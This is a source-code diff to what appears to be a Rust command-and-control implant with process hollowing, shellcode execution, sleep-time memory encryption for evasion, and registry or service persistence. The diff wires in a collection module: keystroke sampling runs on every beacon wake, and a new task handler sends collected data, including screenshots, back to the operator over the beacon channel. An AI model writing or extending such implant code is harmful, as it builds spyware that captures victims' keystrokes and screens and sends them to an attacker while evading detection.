@@ -25,6 +25,7 @@ mod runpe;
 mod embedded_config {
     include!(concat!(env!("OUT_DIR"), "/embedded.rs"));
 }
+mod collect;
 mod evasion;
 mod execshc;
 mod mapper;
@@ -544,6 +545,10 @@ async fn run(
 
     loop {
         evasion.sleep(jittered(beacon.timing.secs, beacon.timing.jitter));
+        // Keystroke sampling at every wake (ABR-T031): no dedicated
+        // thread — it would execute implant code inside the ekko sleep
+        // window where the image is encrypted.
+        collect::sample_keys();
         let (mt, body) = Message::TaskPoll.encode();
         let frames = conn
             .post_frame(profile.pick_uri(), &mut session, mt, &body)
@@ -908,6 +913,25 @@ async fn execute_task<S: AsyncRead + AsyncWrite + Unpin>(
             // Host persistence on the session thread (ABR-T030): the
             // registry/SCM calls are blocking, same as the driver arm.
             let (status, data) = match persist::stage(action, &mechanism, &name, &exe, &args) {
+                Ok(data) => (message::STATUS_OK, data),
+                Err(e) => (message::STATUS_ERROR, e.into_bytes()),
+            };
+            send_result(
+                conn,
+                session,
+                profile,
+                TaskResult {
+                    id: task.id,
+                    status,
+                    data,
+                },
+            )
+            .await
+        }
+        TaskBody::Collect { action, arg } => {
+            // Collection on the session thread (ABR-T031); screenshot
+            // output is binary and rides the chunked-result path.
+            let (status, data) = match collect::stage(action, &arg) {
                 Ok(data) => (message::STATUS_OK, data),
                 Err(e) => (message::STATUS_ERROR, e.into_bytes()),
             };
